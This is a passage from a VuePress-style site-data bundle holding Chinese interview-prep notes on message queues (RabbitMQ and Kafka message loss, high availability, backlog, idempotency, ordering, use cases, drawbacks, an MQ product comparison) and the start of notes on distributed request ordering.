2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"如何保证消息传输不丢失？",frontmatter:{title:"如何保证消息传输不丢失？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/ff9092/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/03.%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%BC%A0%E8%BE%93%E4%B8%8D%E4%B8%A2%E5%A4%B1%EF%BC%9F.html",relativePath:"11.消息队列/03.如何保证消息传输不丢失？.md",key:"v-3e68cfb4",path:"/pages/ff9092/",headers:[{level:2,title:"2.1 生产者弄丢了数据",slug:"_2-1-生产者弄丢了数据",normalizedTitle:"2.1 生产者弄丢了数据",charIndex:31},{level:2,title:"2.2 RabbitMQ丢失数据",slug:"_2-2-rabbitmq丢失数据",normalizedTitle:"2.2 rabbitmq丢失数据",charIndex:290},{level:2,title:"2.3 消费者丢失数据",slug:"_2-3-消费者丢失数据",normalizedTitle:"2.3 消费者丢失数据",charIndex:794}],headersStr:"2.1 生产者弄丢了数据 2.2 RabbitMQ丢失数据 2.3 消费者丢失数据",content:"# 1. 为什么会丢数据\n\n\n\n\n# 2. 解决办法\n\n\n# 2.1 生产者弄丢了数据\n\n生产者将数据发送到RabbitMQ的时候，可能数据就在半路给搞丢了，因为网络啥的问题，都有可能。\n\n方法1 ： 用RabbitMQ提供的事务功能（同步） 生产者发送数据之前，开启RabbitMQ事务（channel.txSelect），然后发送消息，此时就可以回滚事务（channel.txRollback），然后重试发送消息，如果收到了消息，那么可以提交事务，但是问题是，RabbitMQ事务机制一搞，基本上吞吐量会下来，因为太损耗性能。 方法2：confirm机制（异步回调）\n\n\n# 2.2 RabbitMQ丢失数据\n\n这个就是RabbitMQ自己丢失数据，这个时候就必须开启RabbitMQ的持久化，就是消息写入之后，同时需要持久化到磁盘中，哪怕是RabbitMQ自己宕机了，也能够从磁盘中读取之前存储的消息，这样数据一般就不会丢失了，但是存在一个极端的情况，就是RabbitMQ还没持久化的时候，就已经宕机了，那么可能会造成少量的数据丢失，但是这个概率是比较小的。\n\n设置持久化的两个步骤，第一个是创建queue的时候，将其持久化的，这样就保证了RabbitMQ持久化queue的元数据，但是不会持久化queue中的数据，第二个就是发送消息的时候，将消息的deliveryMode设置为2，就是将消息设置为持久化的，此时RabbitMQ将会将消息持久化到磁盘上，必须同时设置两个持久化才行，哪怕是Rabbit挂了，也会从磁盘中恢复queue 和 queue中的数据。\n\n而且持久化可以跟生产者那边的confirm机制配置起来，只有消息被持久化到磁盘后，才会通知生产者ACK了，所以哪怕是在持久化磁盘之前，RabbitMQ挂了，数据丢了，生产者收不到ACK，你也是可以自己重发的。\n\n\n# 2.3 消费者丢失数据\n\n消费者丢失数据，主要是因为打开了AutoAck的机制，消费者会自动通知RabbitMQ，表明自己已经消费完这条数据了，但是如果你消费到了一条消息，还在处理中，还没处理完，此时消费者就会自动AutoAck了，通知RabbitMQ说这条消息已经被消费了，此时不巧的是，消费者系统宕机了，这条消息就会丢失，因为RabbitMQ以为这条消息已经处理掉。\n\n在消费者层面上，我们需要将AutoAck给关闭，然后每次自己确定已经处理完了一条消息后，你再发送ack给RabbitMQ，如果你还没处理完就宕机了，此时RabbitMQ没收到你发的Ack消息，然后RabbitMQ就会将这条消息分配给其它的消费者去处理。",normalizedContent:"# 1. 为什么会丢数据\n\n\n\n\n# 2. 解决办法\n\n\n# 2.1 生产者弄丢了数据\n\n生产者将数据发送到rabbitmq的时候，可能数据就在半路给搞丢了，因为网络啥的问题，都有可能。\n\n方法1 ： 用rabbitmq提供的事务功能（同步） 生产者发送数据之前，开启rabbitmq事务（channel.txselect），然后发送消息，此时就可以回滚事务（channel.txrollback），然后重试发送消息，如果收到了消息，那么可以提交事务，但是问题是，rabbitmq事务机制一搞，基本上吞吐量会下来，因为太损耗性能。 方法2：confirm机制（异步回调）\n\n\n# 2.2 rabbitmq丢失数据\n\n这个就是rabbitmq自己丢失数据，这个时候就必须开启rabbitmq的持久化，就是消息写入之后，同时需要持久化到磁盘中，哪怕是rabbitmq自己宕机了，也能够从磁盘中读取之前存储的消息，这样数据一般就不会丢失了，但是存在一个极端的情况，就是rabbitmq还没持久化的时候，就已经宕机了，那么可能会造成少量的数据丢失，但是这个概率是比较小的。\n\n设置持久化的两个步骤，第一个是创建queue的时候，将其持久化的，这样就保证了rabbitmq持久化queue的元数据，但是不会持久化queue中的数据，第二个就是发送消息的时候，将消息的deliverymode设置为2，就是将消息设置为持久化的，此时rabbitmq将会将消息持久化到磁盘上，必须同时设置两个持久化才行，哪怕是rabbit挂了，也会从磁盘中恢复queue 和 queue中的数据。\n\n而且持久化可以跟生产者那边的confirm机制配置起来，只有消息被持久化到磁盘后，才会通知生产者ack了，所以哪怕是在持久化磁盘之前，rabbitmq挂了，数据丢了，生产者收不到ack，你也是可以自己重发的。\n\n\n# 2.3 消费者丢失数据\n\n消费者丢失数据，主要是因为打开了autoack的机制，消费者会自动通知rabbitmq，表明自己已经消费完这条数据了，但是如果你消费到了一条消息，还在处理中，还没处理完，此时消费者就会自动autoack了，通知rabbitmq说这条消息已经被消费了，此时不巧的是，消费者系统宕机了，这条消息就会丢失，因为rabbitmq以为这条消息已经处理掉。\n\n在消费者层面上，我们需要将autoack给关闭，然后每次自己确定已经处理完了一条消息后，你再发送ack给rabbitmq，如果你还没处理完就宕机了，此时rabbitmq没收到你发的ack消息，然后rabbitmq就会将这条消息分配给其它的消费者去处理。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"如何保证消息队列的高可用？",frontmatter:{title:"如何保证消息队列的高可用？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/eb292c/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/04.%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8%EF%BC%9F.html",relativePath:"11.消息队列/04.如何保证消息队列的高可用？.md",key:"v-0b475278",path:"/pages/eb292c/",headers:[{level:2,title:"1.1 单机模式",slug:"_1-1-单机模式",normalizedTitle:"1.1 单机模式",charIndex:106}],headersStr:"1.1 单机模式",content:"# 1. RabbitMQ高可用性\n\nRabbitMQ是比较有代表性的，因为是基于主从做高可用性的。\n\nRabbitMQ 三种模式：单机模式，普通集群模式，镜像集群模式\n\n只有镜像集群模式能够实现高可用\n\n\n# 1.1 单机模式\n\n就是demo级别的，一般就是本地启动后玩一玩，没有人生产环境中使用。\n\n\n# 1.2 普通集群模式\n\n其中一个节点包含数据 其他的节点没有实际数据，被调用的时候都是向放queue的节点请求 缺点：\n\n * 可能会在RabbitMQ中存在大量的数据传输\n * 可用性没有什么保障，如果queue所在的节点宕机，就会导致queue的消息丢失\n\n\n# 1.3 集群镜像模式\n\n每个节点都有完整数据，如果一个节点挂了，消费者可以在其他节点消费数据 缺点是非分布式架构，集群中每个节点都有完整数据，导致节点负载很重，只能解决吞吐量问题，不能解决负载的问题\n\n\n# 2. kafka实现高可用\n\n将topic数据分别为多个partition分布在了多台机器上，每个partition的数据还有多个备份，分为leader和follower，leader负责写数据和消费，follower同步数据，leader挂了，推选出新的follower",normalizedContent:"# 1. rabbitmq高可用性\n\nrabbitmq是比较有代表性的，因为是基于主从做高可用性的。\n\nrabbitmq 三种模式：单机模式，普通集群模式，镜像集群模式\n\n只有镜像集群模式能够实现高可用\n\n\n# 1.1 单机模式\n\n就是demo级别的，一般就是本地启动后玩一玩，没有人生产环境中使用。\n\n\n# 1.2 普通集群模式\n\n其中一个节点包含数据 其他的节点没有实际数据，被调用的时候都是向放queue的节点请求 缺点：\n\n * 可能会在rabbitmq中存在大量的数据传输\n * 可用性没有什么保障，如果queue所在的节点宕机，就会导致queue的消息丢失\n\n\n# 1.3 集群镜像模式\n\n每个节点都有完整数据，如果一个节点挂了，消费者可以在其他节点消费数据 缺点是非分布式架构，集群中每个节点都有完整数据，导致节点负载很重，只能解决吞吐量问题，不能解决负载的问题\n\n\n# 2. kafka实现高可用\n\n将topic数据分别为多个partition分布在了多台机器上，每个partition的数据还有多个备份，分为leader和follower，leader负责写数据和消费，follower同步数据，leader挂了，推选出新的follower",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息队列百万消息积压在队列中如何处理？",frontmatter:{title:"消息队列百万消息积压在队列中如何处理？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/5e7230/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/05.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%99%BE%E4%B8%87%E6%B6%88%E6%81%AF%E7%A7%AF%E5%8E%8B%E5%9C%A8%E9%98%9F%E5%88%97%E4%B8%AD%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%EF%BC%9F.html",relativePath:"11.消息队列/05.消息队列百万消息积压在队列中如何处理？.md",key:"v-b5797aac",path:"/pages/5e7230/",headersStr:null,content:"产生原因：消费者挂掉了，数据都在MQ里挤压 解决办法：启动新的消费者，将MQ的数据放到另一个MQ中，将这个MQ的数据分发给更多的消费者来消费 让消费者把消息，重新写入MQ中，然后在用 10倍的消费者来进行消费。",normalizedContent:"产生原因：消费者挂掉了，数据都在mq里挤压 解决办法：启动新的消费者，将mq的数据放到另一个mq中，将这个mq的数据分发给更多的消费者来消费 让消费者把消息，重新写入mq中，然后在用 10倍的消费者来进行消费。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息队列如果保证消息的重复消费？（幂等性）",frontmatter:{title:"消息队列如果保证消息的重复消费？（幂等性）",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/fc5594/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/06.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%A6%82%E6%9E%9C%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E7%9A%84%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9%EF%BC%9F%EF%BC%88%E5%B9%82%E7%AD%89%E6%80%A7%EF%BC%89.html",relativePath:"11.消息队列/06.消息队列如果保证消息的重复消费？（幂等性）.md",key:"v-67a8e0e4",path:"/pages/fc5594/",headersStr:null,content:"什么是幂等性\n\n\n# 为什么会出现重复消费？\n\n程序和MQ的交互过程可能会产生重复消费 以kafka为例 消费者如果在准备提交offset，但是还没有提交的时候，消费者进程被重启，那么此时已经消费过数据的offset并没有提交，kafka也就不知道你已经消费了，那么消费者再次上线进行消费的时候，会把已经消费的数据，重新在传递过来，这就是消息重复消费的问题。\n\n\n# 怎么解决\n\n根据业务出发，比如数据要写库，首先根据主键查一下，如果这个数据已经有了，那就别插入了，执行update即可",normalizedContent:"什么是幂等性\n\n\n# 为什么会出现重复消费？\n\n程序和mq的交互过程可能会产生重复消费 以kafka为例 消费者如果在准备提交offset，但是还没有提交的时候，消费者进程被重启，那么此时已经消费过数据的offset并没有提交，kafka也就不知道你已经消费了，那么消费者再次上线进行消费的时候，会把已经消费的数据，重新在传递过来，这就是消息重复消费的问题。\n\n\n# 怎么解决\n\n根据业务出发，比如数据要写库，首先根据主键查一下，如果这个数据已经有了，那就别插入了，执行update即可",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息队列如何保证消息的顺序性？",frontmatter:{title:"消息队列如何保证消息的顺序性？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/427056/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/07.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%80%A7%EF%BC%9F.html",relativePath:"11.消息队列/07.消息队列如何保证消息的顺序性？.md",key:"v-327e57e0",path:"/pages/427056/",headersStr:null,content:"# 1. 产生原因\n\n在消息队列中，一个queue中的数据，一次只会被一个消费者消费掉 但因为不同消费者的执行速度不一致，在存入数据库后，造成顺序不一致的问题\n\n\n# 2. 解决办法\n\n 1. rabbitmq\n 2. kafka",normalizedContent:"# 1. 产生原因\n\n在消息队列中，一个queue中的数据，一次只会被一个消费者消费掉 但因为不同消费者的执行速度不一致，在存入数据库后，造成顺序不一致的问题\n\n\n# 2. 解决办法\n\n 1. rabbitmq\n 2. kafka",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息中间件的应用场景",frontmatter:{title:"消息中间件的应用场景",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/fc28da/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/08.%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.html",relativePath:"11.消息队列/08.消息中间件的应用场景.md",key:"v-0a311fbb",path:"/pages/fc28da/",headersStr:null,content:"# 1.异步通信\n\n有些业务不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们。\n\n\n# 2. 缓冲\n\n在任何重要的系统中，都会有需要不同的处理时间的元素。消息队列通过一个缓冲层来帮助任务最高效率的执行，该缓冲有助于控制和优化数据流经过系统的速度。以调节系统响应时间。\n\n\n# 3. 解耦\n\n降低工程间的强依赖程度，针对异构系统进行适配。在项目启动之初来预测将来项目会碰到什么需求，是极其困难的。通过消息系统在处理过程中间插入了一个隐含的、基于数据的接口层，两边的处理过程都要实现这一接口，当应用发生变化时，可以独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。\n\n\n# 4. 冗余\n\n有些情况下，处理数据的过程会失败。除非数据被持久化，否则将造成丢失。消息队列把数据进行持久化直到它们已经被完全处理，通过这一方式规避了数据丢失风险。许多消息队列所采用的”插入-获取-删除”范式中，在把一个消息从队列中删除之前，需要你的处理系统明确的指出该消息已经被处理完毕，从而确保你的数据被安全的保存直到你使用完毕。\n\n\n# 5. 扩展性\n\n因为消息队列解耦了你的处理过程，所以增大消息入队和处理的频率是很容易的，只要另外增加处理过程即可。不需要改变代码、不需要调节参数。便于分布式扩容。\n\n\n# 6. 可恢复性\n\n系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理。\n\n\n# 7. 顺序保证\n\n在大多使用场景下，数据处理的顺序都很重要。大部分消息队列本来就是排序的，并且能保证数据会按照特定的顺序来处理。\n\n\n# 8. 过载保护\n\n在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量无法提取预知；如果以为了能处理这类瞬间峰值访问为标准来投入资源随时待命无疑是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃。\n\n\n# 9. 数据流处理\n\n分布式系统产生的海量数据流，如：业务日志、监控数据、用户行为等，针对这些数据流进行实时或批量采集汇总，然后进行大数据分析是当前互联网的必备技术，通过消息队列完成此类数据收集是最好的选择。",normalizedContent:"# 1.异步通信\n\n有些业务不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们。\n\n\n# 2. 缓冲\n\n在任何重要的系统中，都会有需要不同的处理时间的元素。消息队列通过一个缓冲层来帮助任务最高效率的执行，该缓冲有助于控制和优化数据流经过系统的速度。以调节系统响应时间。\n\n\n# 3. 解耦\n\n降低工程间的强依赖程度，针对异构系统进行适配。在项目启动之初来预测将来项目会碰到什么需求，是极其困难的。通过消息系统在处理过程中间插入了一个隐含的、基于数据的接口层，两边的处理过程都要实现这一接口，当应用发生变化时，可以独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。\n\n\n# 4. 冗余\n\n有些情况下，处理数据的过程会失败。除非数据被持久化，否则将造成丢失。消息队列把数据进行持久化直到它们已经被完全处理，通过这一方式规避了数据丢失风险。许多消息队列所采用的”插入-获取-删除”范式中，在把一个消息从队列中删除之前，需要你的处理系统明确的指出该消息已经被处理完毕，从而确保你的数据被安全的保存直到你使用完毕。\n\n\n# 5. 扩展性\n\n因为消息队列解耦了你的处理过程，所以增大消息入队和处理的频率是很容易的，只要另外增加处理过程即可。不需要改变代码、不需要调节参数。便于分布式扩容。\n\n\n# 6. 可恢复性\n\n系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理。\n\n\n# 7. 顺序保证\n\n在大多使用场景下，数据处理的顺序都很重要。大部分消息队列本来就是排序的，并且能保证数据会按照特定的顺序来处理。\n\n\n# 8. 过载保护\n\n在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量无法提取预知；如果以为了能处理这类瞬间峰值访问为标准来投入资源随时待命无疑是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃。\n\n\n# 9. 数据流处理\n\n分布式系统产生的海量数据流，如：业务日志、监控数据、用户行为等，针对这些数据流进行实时或批量采集汇总，然后进行大数据分析是当前互联网的必备技术，通过消息队列完成此类数据收集是最好的选择。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息队列的缺点",frontmatter:{title:"消息队列的缺点",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/1dd0a5/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/09.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E7%BC%BA%E7%82%B9.html",relativePath:"11.消息队列/09.消息队列的缺点.md",key:"v-1511a062",path:"/pages/1dd0a5/",headersStr:null,content:" * 系统可用性降低：系统引入的外部依赖越多，越容易挂掉，本来你就是A系统调用BCD三个系统接口就好了，人家ABCD四个系统好好的，没啥问题，这个时候却加入了MQ进来，万一MQ挂了怎么办？MQ挂了整套系统也会崩溃了。\n * 系统复杂性提高：硬生生加个MQ进来，你怎么保证消息没有重复消费？怎么处理消息丢失的情况？怎么保证消息传递的顺序性？\n * 一致性问题：A系统处理完了直接返回成功了，人都以为你的请求成功了，但是问题是，要在BCD三个系统中，BD两个系统写库成功了，结果C系统写库失败了，这样就会存在数据不一致的问题。",normalizedContent:" * 系统可用性降低：系统引入的外部依赖越多，越容易挂掉，本来你就是a系统调用bcd三个系统接口就好了，人家abcd四个系统好好的，没啥问题，这个时候却加入了mq进来，万一mq挂了怎么办？mq挂了整套系统也会崩溃了。\n * 系统复杂性提高：硬生生加个mq进来，你怎么保证消息没有重复消费？怎么处理消息丢失的情况？怎么保证消息传递的顺序性？\n * 一致性问题：a系统处理完了直接返回成功了，人都以为你的请求成功了，但是问题是，要在bcd三个系统中，bd两个系统写库成功了，结果c系统写库失败了，这样就会存在数据不一致的问题。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"MQ产品的比较",frontmatter:{title:"MQ产品的比较",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/a350a0/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/10.MQ%E4%BA%A7%E5%93%81%E7%9A%84%E6%AF%94%E8%BE%83.html",relativePath:"11.消息队列/10.MQ产品的比较.md",key:"v-50e3afbe",path:"/pages/a350a0/",headersStr:null,content:"常见的MQ产品包括：Kafka、ActiveMQ、RabbitMQ、RocketMQ\n\n特性MQ       ACTIVEMQ   RABBITMQ   ROCKETMQ   KAFKA\n生产者消费者模式   支持         支持         支持         支持\n发布订阅模式     支持         支持         支持         支持\n请求回应模式     支持         支持         不支持        不支持\nApi完备性     高          高          高          高\n多语言支持      支持         支持         java       支持\n单机吞吐量      万级         万级         万级         十万级\n消息延迟       毫秒级        微秒级        毫秒级        毫秒级\n可用性        高（主从）      高（主从）      非常高（分布式）   非常高（分布式）\n消息丢失       低          低          理论上不会丢失    理论上不会丢失\n文档的完备性     高          高          高          高\n提供快速入门     有          有          有          有\n社区活跃度      高          高          有          高\n商业支持       无          无          商业云        商业云",normalizedContent:"常见的mq产品包括：kafka、activemq、rabbitmq、rocketmq\n\n特性mq       activemq   rabbitmq   rocketmq   kafka\n生产者消费者模式   支持         支持         支持         支持\n发布订阅模式     支持         支持         支持         支持\n请求回应模式     支持         支持         不支持        不支持\napi完备性     高          高          高          高\n多语言支持      支持         支持         java       支持\n单机吞吐量      万级         万级         万级         十万级\n消息延迟       毫秒级        微秒级        毫秒级        毫秒级\n可用性        高（主从）      高（主从）      非常高（分布式）   非常高（分布式）\n消息丢失       低          低          理论上不会丢失    理论上不会丢失\n文档的完备性     高          高          高          高\n提供快速入门     有          有          有          有\n社区活跃度      高          高          有          高\n商业支持       无          无          商业云        商业云",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"消息队列",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"11.消息队列",imgUrl:"/img/catalog.png",description:"消息队列"}},title:"消息队列",date:"2022-04-17T21:48:12.000Z",permalink:"/mq/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/catalog.html",relativePath:"11.消息队列/catalog.md",key:"v-c5579ed0",path:"/mq/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/26, 23:15:39",lastUpdatedTimestamp:1650986139e3},{title:"分布式服务接口请求的顺序如何保证？",frontmatter:{title:"分布式服务接口请求的顺序如何保证？",date:"2022-04-18T00:00:43.000Z",permalink:"/pages/79e948/",categories:["微服务"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/12.%E5%BE%AE%E6%9C%8D%E5%8A%A1/01.%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E8%AF%B7%E6%B1%82%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%EF%BC%9F.html",relativePath:"12.微服务/01.分布式服务接口请求的顺序如何保证？.md",key:"v-1f6eb0be",path:"/pages/79e948/",headers:[{level:2,title:"分布式服务接口请求的顺序如何保证？",slug:"分布式服务接口请求的顺序如何保证",normalizedTitle:"分布式服务接口请求的顺序如何保证？",charIndex:2},{level:2,title:"采用MQ以及内存队列来解决",slug:"采用mq以及内存队列来解决",normalizedTitle:"采用mq以及内存队列来解决",charIndex:681},{level:2,title:"采用分布式锁来解决",slug:"采用分布式锁来解决",normalizedTitle:"采用分布式锁来解决",charIndex:876}],headersStr:"分布式服务接口请求的顺序如何保证？ 采用MQ以及内存队列来解决 采用分布式锁来解决",content:"# 分布式服务接口请求的顺序如何保证？\n\n其实分布式系统接口的调用顺序，也是个问题，一般来说是不用保证顺序的。但是有的时候可能确实是需要严格的顺序保证。给大家举个例子，你服务A调用服务B，先插入再删除。好，结果俩请求过去了，落在不同机器上，可能插入请求因为某些原因执行慢了一些，导致删除请求先执行了，此时因为没数据所以啥效果也没有；结果这个时候插入请求过来了，好，数据插入进去了，那就尴尬了。\n\n本来应该是先插入 -> 再删除，这条数据应该没了，结果现在先删除 -> 再插入，数据还存在，最后你死都想不明白是怎么回事。所以这都是分布式系统一些很常见的问题\n\n\n\n首先，一般来说，我个人给你的建议是，你们从业务逻辑上最好设计的这个系统不需要这种顺序性的保证，因为一旦引入顺序性保障，会导致系统复杂度上升，而且会带来效率低下，热点数据压力过大，等问题。\n\n下面我给个我们用过的方案吧，简单来说，首先你得用dubbo的一致性hash负载均衡策略，将比如某一个订单id对应的请求都给分发到某个机器上去，接着就是在那个机器上因为可能还是多线程并发执行的，你可能得立即将某个订单id对应的请求扔一个内存队列里去，强制排队，这样来确保他们的顺序性。\n\n但是这样引发的后续问题就很多，比如说要是某个订单对应的请求特别多，造成某台机器成热点怎么办？解决这些问题又要开启后续一连串的复杂技术方案。。。曾经这类问题弄的我们头疼不已，所以，还是建议什么呢？\n\n最好是比如说刚才那种，一个订单的插入和删除操作，能不能合并成一个操作，就是一个删除，或者是什么，避免这种问题的产生。\n\n\n# 采用MQ以及内存队列来解决\n\n方式1，也是最友好的方式就是使用消息队列和内存队列来解决，首先我们需要做的就是把需要保证顺序的请求，通过Hash算法分发到特定的同一台机器上，然后机器内部在把请求放到内存队列中，线程从内存队列中获取消费，保证线程的顺序性\n\n但是这种方式能解决99%的顺序性，但是接入服务还是可能存在问题，比如把请求 123，弄成231，导致送入MQ队列中顺序也不一致\n\n\n# 采用分布式锁来解决\n\n分布式锁能够保证强一致性，但是因为引入这种重量级的同步机制，会导致并发量急剧降低，因为需要频繁的获取锁，释放锁的操作。",normalizedContent:"# 分布式服务接口请求的顺序如何保证？\n\n其实分布式系统接口的调用顺序，也是个问题，一般来说是不用保证顺序的。但是有的时候可能确实是需要严格的顺序保证。给大家举个例子，你服务a调用服务b，先插入再删除。好，结果俩请求过去了，落在不同机器上，可能插入请求因为某些原因执行慢了一些，导致删除请求先执行了，此时因为没数据所以啥效果也没有；结果这个时候插入请求过来了，好，数据插入进去了，那就尴尬了。\n\n本来应该是先插入 -> 再删除，这条数据应该没了，结果现在先删除 -> 再插入，数据还存在，最后你死都想不明白是怎么回事。所以这都是分布式系统一些很常见的问题\n\n\n\n首先，一般来说，我个人给你的建议是，你们从业务逻辑上最好设计的这个系统不需要这种顺序性的保证，因为一旦引入顺序性保障，会导致系统复杂度上升，而且会带来效率低下，热点数据压力过大，等问题。\n\n下面我给个我们用过的方案吧，简单来说，首先你得用dubbo的一致性hash负载均衡策略，将比如某一个订单id对应的请求都给分发到某个机器上去，接着就是在那个机器上因为可能还是多线程并发执行的，你可能得立即将某个订单id对应的请求扔一个内存队列里去，强制排队，这样来确保他们的顺序性。\n\n但是这样引发的后续问题就很多，比如说要是某个订单对应的请求特别多，造成某台机器成热点怎么办？解决这些问题又要开启后续一连串的复杂技术方案。。。曾经这类问题弄的我们头疼不已，所以，还是建议什么呢？\n\n最好是比如说刚才那种，一个订单的插入和删除操作，能不能合并成一个操作，就是一个删除，或者是什么，避免这种问题的产生。\n\n\n# 采用mq以及内存队列来解决\n\n方式1，也是最友好的方式就是使用消息队列和内存队列来解决，首先我们需要做的就是把需要保证顺序的请求，通过hash算法分发到特定的同一台机器上，然后机器内部在把请求放到内存队列中，线程从内存队列中获取消费，保证线程的顺序性\n\n但是这种方式能解决99%的顺序性，但是接入服务还是可能存在问题，比如把请求 123，弄成231，导致送入mq队列中顺序也不一致\n\n\n# 采用分布式锁来解决\n\n分布式锁能够保证强一致性，但是因为引入这种重量级的同步机制，会导致并发量急剧降低，因为需要频繁的获取锁，释放锁的操作。",charsets:{cjk:!0},lastUpdated:"2022/04/26, 23:44:33",lastUpdatedTimestamp:1650987873e3},{title:"如何设计一个高并发系统",frontmatter:{title:"如何设计一个高并发系统",date:"2022-04-18T00:00:43.000Z",permalink:"/pages/cccdf5/",categories:["微服务"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/12.%E5%BE%AE%E6%9C%8D%E5%8A%A1/02.%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E9%AB%98%E5%B9%B6%E5%8F%91%E7%B3%BB%E7%BB%9F.html",relativePath:"12.微服务/02.如何设计一个高并发系统.md",key:"v-20b7b93b",path:"/pages/cccdf5/",headers:[{level:2,title:"如何设计一个高并发系统",slug:"如何设计一个高并发系统",normalizedTitle:"如何设计一个高并发系统",charIndex:2},{level:2,title:"前言",slug:"前言",normalizedTitle:"前言",charIndex:18},{level:2,title:"面试题剖析",slug:"面试题剖析",normalizedTitle:"面试题剖析",charIndex:405}],headersStr:"如何设计一个高并发系统 前言 面试题剖析",content:"# 如何设计一个高并发系统\n\n\n# 